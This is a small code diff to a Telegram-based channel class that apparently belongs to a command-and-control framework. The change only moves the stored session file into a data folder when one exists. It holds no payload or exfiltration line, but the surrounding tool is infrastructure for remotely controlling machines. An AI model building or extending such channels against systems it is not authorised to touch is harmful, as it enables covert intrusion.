@@ -42,8 +42,9 @@ class TelegramChannel(C2Channel):
 
     def connect(self):
         self._loop = asyncio.new_event_loop()
+        session_path = "data/server_session" if __import__("os").path.exists("data") else "server_session"
         self._client = TelegramClient(
-            "server_session", self._api_id, self._api_hash,
+            session_path, self._api_id, self._api_hash,
             loop=self._loop
         )
 
